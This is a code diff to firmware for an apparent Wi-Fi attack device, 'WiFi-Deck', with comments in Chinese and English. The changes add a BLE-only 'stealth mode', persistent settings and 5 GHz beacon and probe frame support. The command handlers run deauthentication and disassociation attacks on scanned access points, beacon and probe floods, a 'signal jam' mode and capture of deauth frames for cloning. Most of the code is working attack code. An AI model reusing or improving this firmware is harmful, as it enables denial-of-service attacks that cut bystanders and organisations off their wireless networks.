@@ -40,6 +40,12 @@
 #include "WiFiClient.h"
 #include "platform_stdlib.h"
 #include "BLEDevice.h"
+#include <FlashMemory.h>
+
+extern "C" {
+#include "gap_le.h"
+#include "gap_adv.h"
+}
 
 #ifdef max
 #undef max
@@ -53,11 +59,18 @@
 //==========================
 // User Configuration
 //==========================
-#define WIFI_SSID       "WiFi-Deck"
-#define WIFI_PASS       "12345678"
-#define WIFI_CHANNEL    1
+#define DEFAULT_WIFI_SSID "WiFi-Deck"
+#define DEFAULT_WIFI_PASS "12345678"
+#define DEFAULT_BLE_NAME  "WiFi-Deck"
+#define WIFI_CHANNEL      1
+
+char ap_ssid[33]  = DEFAULT_WIFI_SSID;
+char ap_pass[65]  = DEFAULT_WIFI_PASS;
+char ble_name[27] = DEFAULT_BLE_NAME;
 
 bool USE_LED = true;
+bool apEnabled = true;        // SoftAP/WebUI 是否开启（ap off 后进入 BLE-only 隐身省电模式）
+bool pendingApRestart = false; // 延迟重启 SoftAP 标志（确保 BLE/HTTP 响应先发回再重开热点）
 
 // Attack parameters
 unsigned long last_cycle     = 0;
@@ -199,6 +212,7 @@ String extractSSID(const uint8_t *frame, int totalLen, int possibleOffset = 36);
 bool isPwnagotchiMac(const uint8_t *mac);
 bool isEAPOL(const uint8_t *buf, int len);
 void startSoftAP();
+void pushSniffLog(const char *msg);
 
 // =========================
 // 802.11 Header Structure
@@ -334,10 +348,8 @@ void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/)
 // Utility Functions
 // =========================
 void setChannel(int newChannel) {
-  if (!isSniffing) {
-    wifi_on(RTW_MODE_PROMISC);
-    wifi_enter_promisc_mode();
-  }
+  // 切信道本身无需进入混杂模式；进入混杂模式会关掉 SoftAP 热点，
+  // 若在非嗅探态被误触发会导致 WebUI 永久失联。
   currentChannel = newChannel;
   wifi_set_channel(currentChannel);
 }
@@ -353,19 +365,18 @@ void hopChannel() {
       currentChannel = customChannels[currentChannelIndex];
     } else {
       static bool use5GHz = false;
-      if (use5GHz) {
-        if (currentChannelIndex >= sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0])) {
-          currentChannelIndex = 0;
-          use5GHz = false;
-        }
-        currentChannel = CHANNELS_5GHZ[currentChannelIndex];
-      } else {
-        if (currentChannelIndex >= sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0])) {
-          currentChannelIndex = 0;
-          use5GHz = true;
-        }
-        currentChannel = CHANNELS_2GHZ[currentChannelIndex];
+      const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
+      const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
+
+      // 频段翻转后必须按新频段数组取值，否则会漏跳 2.4G CH1 与 5G CH36
+      if (!use5GHz && currentChannelIndex >= num2G) {
+        currentChannelIndex = 0;
+        use5GHz = true;
+      } else if (use5GHz && currentChannelIndex >= num5G) {
+        currentChannelIndex = 0;
+        use5GHz = false;
       }
+      currentChannel = use5GHz ? CHANNELS_5GHZ[currentChannelIndex] : CHANNELS_2GHZ[currentChannelIndex];
     }
 
     setChannel(currentChannel);
@@ -388,15 +399,25 @@ void startSniffing() {
 }
 
 void stopSniffing() {
-  if (isSniffing) {
+  if (isSniffing || deauth_sniff_enabled) {
     wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
     isSniffing = false;
+    deauth_sniff_enabled = false;
+    has_sniffed_deauth = false;
     currentMode = SNIFF_STOP;
     Serial.println("[CMD] Sniffer stopped");
-    // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
-    // bring the AP and web server back up so the phone can reconnect.
-    startSoftAP();
-    Serial.println("[INFO] Soft AP restarted: " WIFI_SSID);
+    if (apEnabled) {
+      // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
+      // bring the AP and web server back up so the phone can reconnect.
+      startSoftAP();
+      Serial.println("[INFO] Soft AP restarted: " + String(ap_ssid));
+    } else {
+      // BLE-only stealth mode (ap off): restore STA mode so scan/TX work without broadcasting AP
+      wifi_off();
+      delay(20);
+      wifi_on(RTW_MODE_STA);
+      Serial.println("[INFO] Restored STA mode (BLE-only stealth).");
+    }
   }
 }
 
@@ -404,17 +425,25 @@ String extractSSID(const uint8_t *frame, int totalLen, int possibleOffset) {
   if (totalLen < possibleOffset + 2) {
     return "";
   }
-  uint8_t tagNumber  = frame[possibleOffset];
-  uint8_t tagLength  = frame[possibleOffset + 1];
-  if (tagNumber == 0 && possibleOffset + 2 + tagLength <= totalLen) {
-    String essid;
-    for (int i = 0; i < tagLength; i++) {
-      char c = (char)frame[possibleOffset + 2 + i];
-      if (c >= 32 && c <= 126) {
-        essid += c;
+  int offset = possibleOffset;
+  // 遍历 IE TLV，直到找到 SSID (tag 0) 或超出边界
+  while (offset + 2 <= totalLen) {
+    uint8_t tagNumber = frame[offset];
+    uint8_t tagLength = frame[offset + 1];
+    if (offset + 2 + tagLength > totalLen) break;  // 畸形长度，停止
+    if (tagNumber == 0) {
+      String essid;
+      essid.reserve(tagLength);
+      for (int i = 0; i < tagLength; i++) {
+        uint8_t c = frame[offset + 2 + i];
+        // 保留可打印 ASCII 与 UTF-8 多字节(>=0x80，含中文)，仅丢弃 ASCII 控制符
+        if (c >= 0x20) {
+          essid += (char)c;
+        }
       }
+      return essid;
     }
-    return essid;
+    offset += 2 + tagLength;
   }
   return "";
 }
@@ -428,22 +457,19 @@ bool isPwnagotchiMac(const uint8_t *mac) {
 }
 
 bool isEAPOL(const uint8_t *buf, int len) {
-  if (len < (24 + 8 + 4)) {
-    return false;
-  }
-  if (buf[24] == 0xAA && buf[25] == 0xAA && buf[26] == 0x03 &&
-      buf[27] == 0x00 && buf[28] == 0x00 && buf[29] == 0x00 &&
-      buf[30] == 0x88 && buf[31] == 0x8E) {
-    return true;
-  }
-  if ((buf[0] & 0x0F) == 0x08) {
-    if (buf[26] == 0xAA && buf[27] == 0xAA && buf[28] == 0x03 &&
-        buf[29] == 0x00 && buf[30] == 0x00 && buf[31] == 0x00 &&
-        buf[32] == 0x88 && buf[33] == 0x8E) {
-      return true;
-    }
-  }
-  return false;
+  if (!buf || len < 32) return false;
+  uint8_t ftype = (buf[0] & 0x0C) >> 2;
+  if (ftype != 2) return false; // 必须是 Data 帧
+  // 精确计算 802.11 帧头长度，覆盖 QoS / 4-Address(WDS) / +HTC 变体
+  int hdrLen = 24;
+  if ((buf[1] & 0x03) == 0x03) hdrLen += 6; // ToDS=1 & FromDS=1 -> 4-Address，多 6 字节
+  if ((buf[0] & 0x80) != 0)    hdrLen += 2; // QoS Data (Subtype bit3)
+  if ((buf[1] & 0x80) != 0)    hdrLen += 4; // +HTC (Order bit)
+  if (len < hdrLen + 8) return false;
+  // LLC/SNAP (AA AA 03 00 00 00) + EtherType 0x888E (EAPOL)
+  return (buf[hdrLen] == 0xAA && buf[hdrLen + 1] == 0xAA && buf[hdrLen + 2] == 0x03 &&
+          buf[hdrLen + 3] == 0x00 && buf[hdrLen + 4] == 0x00 && buf[hdrLen + 5] == 0x00 &&
+          buf[hdrLen + 6] == 0x88 && buf[hdrLen + 7] == 0x8E);
 }
 
 //==========================================================
@@ -506,10 +532,11 @@ BLECharacteristic BleTx(CHARACTERISTIC_UUID_TX);
 BLEAdvertData advdata;
 BLEAdvertData scndata;
 volatile bool bleNotifyEnabled = false;
+volatile uint8_t activeConnId = 0;  // 当前 BLE 连接 ID（configServer(1) 下恒为 0，但语义上应记录回调传入值）
 
 // Cross-thread command ring queue (BLE task -> loop)
 #define CMD_RING_SIZE 8
-char cmdRing[CMD_RING_SIZE][128];
+char cmdRing[CMD_RING_SIZE][BLE_BUF_SIZE];
 volatile uint8_t cmdHead = 0;
 volatile uint8_t cmdTail = 0;
 
@@ -519,24 +546,102 @@ volatile uint8_t logHead = 0;
 volatile uint8_t logTail = 0;
 
 //==========================================================
+// Flash Persistence (NVS Config Storage)
+//==========================================================
+#define CFG_MAGIC 0x57444B32UL  // "WDK2"
+
+#pragma pack(push, 1)
+struct PersistConfig {
+  uint32_t magic;
+  char ap_ssid[33];
+  char ap_pass[65];
+  char ble_name[27];
+  uint32_t cycle_delay;
+  uint32_t scan_time;
+  uint32_t num_send_frames;
+  int32_t start_channel;
+  uint8_t scan_between_cycles;
+  uint8_t use_led;
+};
+#pragma pack(pop)
+
+void loadConfigFromFlash() {
+  FlashMemory.read();
+  PersistConfig cfg;
+  memcpy(&cfg, FlashMemory.buf, sizeof(PersistConfig));
+  if (cfg.magic != CFG_MAGIC) {
+    Serial.println("[CFG] No valid flash config found, using defaults.");
+    return;
+  }
+  cfg.ap_ssid[32] = '\0';
+  cfg.ap_pass[64] = '\0';
+  cfg.ble_name[26] = '\0';
+
+  if (strlen(cfg.ap_ssid) >= 1 && strlen(cfg.ap_ssid) <= 32) {
+    strcpy(ap_ssid, cfg.ap_ssid);
+  }
+  if (strlen(cfg.ap_pass) >= 8 && strlen(cfg.ap_pass) <= 63) {
+    strcpy(ap_pass, cfg.ap_pass);
+  }
+  if (strlen(cfg.ble_name) >= 1 && strlen(cfg.ble_name) <= 26) {
+    strcpy(ble_name, cfg.ble_name);
+  }
+  if (cfg.cycle_delay >= 100 && cfg.cycle_delay <= 60000) {
+    cycle_delay = cfg.cycle_delay;
+  }
+  if (cfg.scan_time >= 500 && cfg.scan_time <= 30000) {
+    scan_time = cfg.scan_time;
+  }
+  if (cfg.num_send_frames >= 1 && cfg.num_send_frames <= 100) {
+    num_send_frames = cfg.num_send_frames;
+  }
+  if (cfg.start_channel == 1 || cfg.start_channel >= 36) {
+    start_channel = cfg.start_channel;
+  }
+  scan_between_cycles = (cfg.scan_between_cycles != 0);
+  USE_LED = (cfg.use_led != 0);
+  Serial.println("[CFG] Loaded config from Flash: SSID='" + String(ap_ssid) + "', BLE='" + String(ble_name) + "'");
+}
+
+void saveConfigToFlash() {
+  PersistConfig cfg;
+  memset(&cfg, 0, sizeof(PersistConfig));
+  cfg.magic = CFG_MAGIC;
+  strncpy(cfg.ap_ssid, ap_ssid, sizeof(cfg.ap_ssid) - 1);
+  strncpy(cfg.ap_pass, ap_pass, sizeof(cfg.ap_pass) - 1);
+  strncpy(cfg.ble_name, ble_name, sizeof(cfg.ble_name) - 1);
+  cfg.cycle_delay = cycle_delay;
+  cfg.scan_time = scan_time;
+  cfg.num_send_frames = num_send_frames;
+  cfg.start_channel = start_channel;
+  cfg.scan_between_cycles = scan_between_cycles ? 1 : 0;
+  cfg.use_led = USE_LED ? 1 : 0;
+
+  FlashMemory.read();
+  memcpy(FlashMemory.buf, &cfg, sizeof(PersistConfig));
+  FlashMemory.update();
+}
+
+//==========================================================
 // Web Server
 //==========================================================
 WiFiServer webServer(80);
 
 void startSoftAP() {
+  // Close any previous listening socket before tearing down WLAN to prevent lwIP socket leak
+  webServer.end();
   // Force-close WLAN first: after promisc mode WLAN0 is still "running", so a
   // bare wifi_on(RTW_MODE_AP) would be blocked by rltk_wlan_running() and the
   // radio would never switch back to AP.
   wifi_off();
   delay(20);
-  char ssid[] = WIFI_SSID;
-  char pass[] = WIFI_PASS;
   char ch[4];
   snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);
   // WiFi.apbegin() completes the full stack init that wifi_start_ap() skips:
   // wifi_on + LwIP_Init + netif_set_addr(192.168.1.1) + dhcps_init (DHCP server).
-  WiFi.apbegin(ssid, pass, ch, 0);
+  WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
   webServer.begin();
+  apEnabled = true;
 }
 
 //==========================================================
@@ -552,7 +657,7 @@ void pushSniffLog(const char *msg) {
 }
 
 void bleSendLine(const String &line) {
-  if (!BLE.connected(0) || !bleNotifyEnabled) return;
+  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
   String payload = line + "\n";
   if (payload.length() > BLE_BUF_SIZE - 1) {
     // 超长兜底：直接丢弃，避免发送截断后的坏 JSON 污染手机端行缓冲
@@ -560,11 +665,12 @@ void bleSendLine(const String &line) {
     return;
   }
   BleTx.setData((uint8_t*)payload.c_str(), payload.length());
-  BleTx.notify(0);
+  BleTx.notify(activeConnId);
   delay(8);  // give the BLE stack time to drain the connection interval
 }
 
 void bleWriteCB(BLECharacteristic* chr, uint8_t connID) {
+  activeConnId = connID;
   if (chr->getDataLen() > 0) {
     String cmd = chr->readString();
     cmd.trim();
@@ -580,12 +686,34 @@ void bleWriteCB(BLECharacteristic* chr, uint8_t connID) {
 }
 
 void bleNotifCB(BLECharacteristic* chr, uint8_t connID, uint16_t cccd) {
+  activeConnId = connID;
   bleNotifyEnabled = (cccd & GATT_CLIENT_CHAR_CONFIG_NOTIFY);
 }
 
-void setupBLE() {
+void updateBleName(const char *newName) {
+  strncpy(ble_name, newName, sizeof(ble_name) - 1);
+  ble_name[sizeof(ble_name) - 1] = '\0';
+
+  BLE.setDeviceName(String(ble_name));
+  char gapName[GAP_DEVICE_NAME_LEN] = {0};
+  strncpy(gapName, ble_name, GAP_DEVICE_NAME_LEN - 1);
+  le_set_gap_param(GAP_PARAM_DEVICE_NAME, GAP_DEVICE_NAME_LEN, gapName);
+
+  advdata.clear();
   advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
-  advdata.addCompleteName("WiFi-Deck");
+  advdata.addCompleteName(ble_name);
+  BLE.configAdvert()->setAdvData(advdata);
+  BLE.configAdvert()->updateAdvertParams();
+  uint8_t slave_init_mtu_req = true;
+  le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);
+  le_adv_update_param();
+}
+
+void setupBLE() {
+  advdata.clear();
+  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+  advdata.addCompleteName(ble_name);
+  scndata.clear();
   scndata.addCompleteServices(BLEUUID(UART_SERVICE_UUID));
 
   BleRx.setWriteProperty(true);
@@ -602,16 +730,17 @@ void setupBLE() {
   UartService.addCharacteristic(BleTx);
 
   BLE.init();
+  BLE.setDeviceName(String(ble_name));
   BLE.configAdvert()->setAdvData(advdata);
   BLE.configAdvert()->setScanRspData(scndata);
   BLE.configServer(1);
   BLE.addService(UartService);
   BLE.beginPeripheral();
-  Serial.println("[INFO] BLE UART service started (WiFi-Deck)");
+  Serial.println("[INFO] BLE UART service started (" + String(ble_name) + ")");
 }
 
 void blePushScanResults() {
-  if (!BLE.connected(0) || !bleNotifyEnabled) return;
+  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
   bleSendLine("{\"t\":\"scan_begin\"}");
   for (size_t i = 0; i < scan_results.size(); i++) {
     String line = "{\"t\":\"ap\",\"i\":" + String(i) +
@@ -625,7 +754,7 @@ void blePushScanResults() {
 }
 
 void blePushStatus() {
-  if (!BLE.connected(0) || !bleNotifyEnabled) return;
+  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
   String line = "{\"t\":\"st\"";
   line += ",\"atk\":" + String(attack_enabled ? 1 : 0);
   line += ",\"dis\":" + String(disassoc_enabled ? 1 : 0);
@@ -634,6 +763,7 @@ void blePushStatus() {
   line += ",\"jam\":" + String(signal_jam_enabled ? 1 : 0);
   line += ",\"snf\":" + String(deauth_sniff_enabled ? 1 : 0);
   line += ",\"snfOn\":" + String(isSniffing ? 1 : 0);
+  line += ",\"sMode\":" + String((int)currentMode);
   line += ",\"hop\":" + String(isHopping ? 1 : 0);
   line += ",\"ch\":" + String(currentChannel);
   line += ",\"ok\":" + String(tx_success_count);
@@ -643,7 +773,7 @@ void blePushStatus() {
 }
 
 void blePushInfo() {
-  if (!BLE.connected(0) || !bleNotifyEnabled) return;
+  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
   String line = "{\"t\":\"cfg\"";
   line += ",\"delay\":" + String(cycle_delay);
   line += ",\"scan\":" + String(scan_time);
@@ -651,8 +781,17 @@ void blePushInfo() {
   line += ",\"ch\":" + String(start_channel);
   line += ",\"sc\":" + String(scan_between_cycles ? 1 : 0);
   line += ",\"led\":" + String(USE_LED ? 1 : 0);
+  line += ",\"ap\":" + String(apEnabled ? 1 : 0);
   line += "}";
   bleSendLine(line);
+
+  // 独立拆行发送设备名称与密码配置，确保单行严格小于 BLE_BUF_SIZE (220B)
+  String idLine = "{\"t\":\"id\"";
+  idLine += ",\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\"";
+  idLine += ",\"pass\":\"" + jsonEscape(String(ap_pass)) + "\"";
+  idLine += ",\"ble\":\"" + jsonEscape(String(ble_name)) + "\"";
+  idLine += "}";
+  bleSendLine(idLine);
 }
 
 //==========================================================
@@ -719,7 +858,7 @@ void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t r
 // Beacon Flood TX
 //==========================================================
 void wifi_tx_beacon_frame(const char* ssid, uint8_t ssid_len, uint8_t channel) {
-  uint8_t buf[80];
+  uint8_t buf[96];
   memset(buf, 0, sizeof(buf));
   int offset = 0;
 
@@ -740,9 +879,18 @@ void wifi_tx_beacon_frame(const char* ssid, uint8_t ssid_len, uint8_t channel) {
   buf[offset++] = ssid_len;
   memcpy(&buf[offset], ssid, ssid_len); offset += ssid_len;
   buf[offset++] = 0x03; buf[offset++] = 0x01; buf[offset++] = channel;  // DS params
-  buf[offset++] = 0x01; buf[offset++] = 0x04;     // Supported Rates (len=4)
-  buf[offset++] = 0x82; buf[offset++] = 0x84;
-  buf[offset++] = 0x8B; buf[offset++] = 0x96;
+  if (channel >= 36) {
+    // 5GHz 802.11a/n OFDM Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
+    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
+    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
+    memcpy(&buf[offset], rates5g, sizeof(rates5g));
+    offset += sizeof(rates5g);
+  } else {
+    // 2.4GHz 802.11b/g Supported Rates (1, 2, 5.5, 11 Mbps)
+    buf[offset++] = 0x01; buf[offset++] = 0x04;
+    buf[offset++] = 0x82; buf[offset++] = 0x84;
+    buf[offset++] = 0x8B; buf[offset++] = 0x96;
+  }
 
   wifi_tx_raw_frame(buf, offset);
 }
@@ -751,7 +899,7 @@ void wifi_tx_beacon_frame(const char* ssid, uint8_t ssid_len, uint8_t channel) {
 // Probe Request Flood TX
 //==========================================================
 void wifi_tx_probe_req_frame(const char* ssid, uint8_t ssid_len) {
-  uint8_t buf[80];
+  uint8_t buf[96];
   memset(buf, 0, sizeof(buf));
   int offset = 0;
 
@@ -766,9 +914,16 @@ void wifi_tx_probe_req_frame(const char* ssid, uint8_t ssid_len) {
   buf[offset++] = 0x00;                           // SSID tag
   buf[offset++] = ssid_len;
   memcpy(&buf[offset], ssid, ssid_len); offset += ssid_len;
-  buf[offset++] = 0x01; buf[offset++] = 0x04;     // Supported Rates (len=4)
-  buf[offset++] = 0x82; buf[offset++] = 0x84;
-  buf[offset++] = 0x8B; buf[offset++] = 0x96;
+  if (currentChannel >= 36) {
+    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
+    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
+    memcpy(&buf[offset], rates5g, sizeof(rates5g));
+    offset += sizeof(rates5g);
+  } else {
+    buf[offset++] = 0x01; buf[offset++] = 0x04;
+    buf[offset++] = 0x82; buf[offset++] = 0x84;
+    buf[offset++] = 0x8B; buf[offset++] = 0x96;
+  }
 
   wifi_tx_raw_frame(buf, offset);
 }
@@ -796,11 +951,14 @@ void sortByChannel(std::vector<WiFiScanResult> &results) {
 // Wi-Fi Scan Callback
 //==========================================================
 volatile bool scan_done = false;
+volatile bool scan_accepting = false;  // 扫描期间才允许驱动线程写入 scan_results
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
+  if (!scan_accepting) return RTW_SUCCESS;
   if (scan_result->scan_complete == 0) {
     rtw_scan_result_t *record = &scan_result->ap_details;
-    record->SSID.val[record->SSID.len] = 0;
+    uint8_t ssidLen = (record->SSID.len > 32) ? 32 : record->SSID.len;
+    record->SSID.val[ssidLen] = 0;
 
     if (record->channel >= start_channel) {
       WiFiScanResult result;
@@ -818,6 +976,7 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
       scan_results.push_back(result);
     }
   } else {
+    scan_accepting = false;
     scan_done = true;
   }
   return RTW_SUCCESS;
@@ -830,6 +989,7 @@ int scanNetworks() {
   Serial.println("Starting WiFi scan...");
   scan_results.clear();
   scan_done = false;
+  scan_accepting = true;
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     if (USE_LED) digitalWrite(LED_G, HIGH);
     // Wait for the driver to signal scan completion, using scan_time only as
@@ -838,12 +998,30 @@ int scanNetworks() {
     while (!scan_done && (millis() - start < scan_time)) {
       delay(50);
     }
+    // 无论完成还是超时，立即切断驱动线程对 scan_results 的后续写入，
+    // 避免跨线程 std::vector 扩容与主线程读写并发导致 HardFault
+    scan_accepting = false;
+    delay(10);
     Serial.println("Scan completed!");
     sortByChannel(scan_results);
+    // 若在周期重扫模式下已有锁定目标，按 BSSID 同步最新信道与选中态
+    if (target_mode && !target_aps.empty()) {
+      for (size_t t = 0; t < target_aps.size(); t++) {
+        for (size_t i = 0; i < scan_results.size(); i++) {
+          if (memcmp(scan_results[i].bssid, target_aps[t].bssid, 6) == 0) {
+            scan_results[i].selected = true;
+            target_aps[t].channel = scan_results[i].channel;
+            target_aps[t].rssi = scan_results[i].rssi;
+            break;
+          }
+        }
+      }
+    }
     blePushScanResults();
     if (USE_LED) digitalWrite(LED_G, LOW);
     return 0;
   } else {
+    scan_accepting = false;
     Serial.println("Failed to start the scan!");
     return 1;
   }
@@ -881,6 +1059,7 @@ void checkTimedAttack() {
   if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
     attack_enabled     = false;
     timedAttackEnabled = false;
+    blePushStatus();
     Serial.println("[INFO] Timed attack ended.");
   }
 }
@@ -961,7 +1140,9 @@ String getInfoJSON() {
   json += "\"start_channel\":" + String(start_channel) + ",";
   json += "\"scan_between_cycles\":" + String(scan_between_cycles ? "true" : "false") + ",";
   json += "\"led\":" + String(USE_LED ? "true" : "false") + ",";
-  json += "\"ssid\":\"" + jsonEscape(String(WIFI_SSID)) + "\",";
+  json += "\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\",";
+  json += "\"pass\":\"" + jsonEscape(String(ap_pass)) + "\",";
+  json += "\"ble_name\":\"" + jsonEscape(String(ble_name)) + "\",";
   json += "\"channel\":" + String(WIFI_CHANNEL);
   json += "}";
   return json;
@@ -1079,12 +1260,40 @@ String getPostValue(const String &body, const String &key) {
 void handleCommand(String command) {
   command.trim();
 
-  if (command.equalsIgnoreCase("start deauther")) {
+  if (command.equalsIgnoreCase("ap off")) {
+    if (isSniffing) {
+      wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
+      isSniffing = false;
+      currentMode = SNIFF_STOP;
+    }
+    webServer.end();
+    wifi_off();
+    delay(20);
+    wifi_on(RTW_MODE_STA);
+    apEnabled = false;
+    blePushInfo();
+    blePushStatus();
+    Serial.println("[INFO] AP + WebUI disabled. BLE-only stealth mode (STA active).");
+  }
+  else if (command.equalsIgnoreCase("ap on")) {
+    if (isSniffing) {
+      wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
+      isSniffing = false;
+      currentMode = SNIFF_STOP;
+    }
+    startSoftAP();
+    blePushInfo();
+    blePushStatus();
+    Serial.println("[INFO] AP + WebUI re-enabled.");
+  }
+  else if (command.equalsIgnoreCase("start deauther")) {
+    if (isSniffing) { stopSniffing(); }
     attack_enabled = true;
+    blePushStatus();
     Serial.println("[INFO] Deauthentication Attack started.");
   }
   else if (command.equalsIgnoreCase("stop deauther") || command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("stop all")) {
-    // Universal stop: kill every attack and restore the soft AP
+    // Universal stop: kill every attack and restore the soft AP (if apEnabled)
     attack_enabled = false;
     disassoc_enabled = false;
     timedAttackEnabled = false;
@@ -1094,13 +1303,17 @@ void handleCommand(String command) {
     signal_jam_enabled = false;
     deauth_sniff_enabled = false;
     has_sniffed_deauth = false;
-    if (isSniffing) { stopSniffing(); }  // restores AP via startSoftAP()
-    wifi_set_channel(WIFI_CHANNEL);       // restore AP channel
+    if (isSniffing) { stopSniffing(); }  // restores AP or STA based on apEnabled
+    wifi_set_channel(WIFI_CHANNEL);       // restore default channel
     currentChannel = WIFI_CHANNEL;
     if (USE_LED) digitalWrite(LED_B, LOW);
+    blePushStatus();
     Serial.println("[INFO] All attacks stopped.");
   }
   else if (command.equalsIgnoreCase("scan")) {
+    if (isSniffing) { stopSniffing(); }
+    target_aps.clear();
+    target_mode = false;
     scan_enabled = true;
     Serial.println("[INFO] Starting scan...");
     if (scanNetworks() == 0) {
@@ -1109,6 +1322,7 @@ void handleCommand(String command) {
       Serial.println("[INFO] Scan completed.");
     }
     else {
+      scan_enabled = false;
       Serial.println("[ERROR] Scan failed.");
     }
   }
@@ -1125,34 +1339,43 @@ void handleCommand(String command) {
     String valStr = command.substring(String("attack_time ").length());
     unsigned long durationMs = valStr.toInt();
     if (durationMs > 0) {
+      if (isSniffing) { stopSniffing(); }
       startTimedAttack(durationMs);
+      blePushStatus();
       Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
     }
   }
   else if (command.equalsIgnoreCase("disassoc")) {
     if (!disassoc_enabled) {
+      if (isSniffing) { stopSniffing(); }
       disassoc_enabled = true;
+      blePushStatus();
       Serial.println("[INFO] Continuous Disassociation Attack started.");
     }
   }
   else if (command.equalsIgnoreCase("random_attack")) {
     if (!scan_results.empty()) {
+      if (isSniffing) { stopSniffing(); }
       size_t idx = random(0, scan_results.size());
       uint8_t randChannel = scan_results[idx].channel;
       if (wifi_set_channel(randChannel) != 0) {
         Serial.print("[WARN] wifi_set_channel(");
         Serial.print(randChannel);
         Serial.println(") failed");
+      } else {
+        currentChannel = randChannel;
       }
       for (unsigned long j = 0; j < num_send_frames; j++) {
         uint16_t reason = deauth_reasons[j % num_deauth_reasons];
         wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, reason);
-        wifi_tx_deauth_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
         wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
-        wifi_tx_disassoc_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
         delay(1);
       }
-      wifi_set_channel(WIFI_CHANNEL);
+      if (apEnabled) {
+        wifi_set_channel(WIFI_CHANNEL);
+        currentChannel = WIFI_CHANNEL;
+      }
+      blePushStatus();
       Serial.print("[RANDOM ATTACK] => ");
       Serial.print(scan_results[idx].ssid);
       Serial.print(" on channel ");
@@ -1172,6 +1395,7 @@ void handleCommand(String command) {
       beacon_flood_count = 0;
       Serial.println("[INFO] Beacon flood started.");
     }
+    blePushStatus();
   }
   else if (command.equalsIgnoreCase("probe_flood") || command.equalsIgnoreCase("probe flood")) {
     if (probe_flood_enabled) {
@@ -1183,6 +1407,7 @@ void handleCommand(String command) {
       probe_flood_count = 0;
       Serial.println("[INFO] Probe flood started.");
     }
+    blePushStatus();
   }
   else if (command.equalsIgnoreCase("signal_jam") || command.equalsIgnoreCase("signal jam")) {
     if (signal_jam_enabled) {
@@ -1198,12 +1423,13 @@ void handleCommand(String command) {
       signal_jam_ch_index = 0;
       Serial.println("[INFO] Signal jam started - rapid channel cycling + deauth.");
     }
+    blePushStatus();
   }
   else if (command.equalsIgnoreCase("deauth_sniff") || command.equalsIgnoreCase("deauth sniff")) {
     if (deauth_sniff_enabled) {
       deauth_sniff_enabled = false;
       has_sniffed_deauth = false;
-      stopSniffing();  // exit promisc, restore AP
+      stopSniffing();  // exit promisc, restore AP or STA
       Serial.println("[INFO] Deauth sniff stopped.");
     } else {
       currentMode = SNIFF_DEAUTH;
@@ -1212,6 +1438,7 @@ void handleCommand(String command) {
       has_sniffed_deauth = false;
       Serial.println("[INFO] Deauth sniff started - listening for deauth frames to clone.");
     }
+    blePushStatus();
   }
   else if (command.startsWith("single_ap") || command.startsWith("single ap")) {
     if (scan_results.empty()) {
@@ -1223,18 +1450,21 @@ void handleCommand(String command) {
       if (idx < 0 || idx >= (int)scan_results.size()) idx = 0;
       if (isSniffing) { stopSniffing(); }
       wifi_set_channel(scan_results[idx].channel);
+      currentChannel = scan_results[idx].channel;
       for (unsigned long j = 0; j < num_send_frames; j++) {
         wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, deauth_reasons[j % num_deauth_reasons]);
-        wifi_tx_deauth_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
         wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
-        wifi_tx_disassoc_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
         delay(1);
       }
-      wifi_set_channel(WIFI_CHANNEL);
+      if (apEnabled) {
+        wifi_set_channel(WIFI_CHANNEL);
+        currentChannel = WIFI_CHANNEL;
+      }
       Serial.print("[SINGLE AP] Attacked ");
       Serial.print(scan_results[idx].ssid);
       Serial.print(" on ch ");
       Serial.println(scan_results[idx].channel);
+      blePushStatus();
     }
   }
   else if (command.equalsIgnoreCase("tx_stats")) {
@@ -1244,18 +1474,25 @@ void handleCommand(String command) {
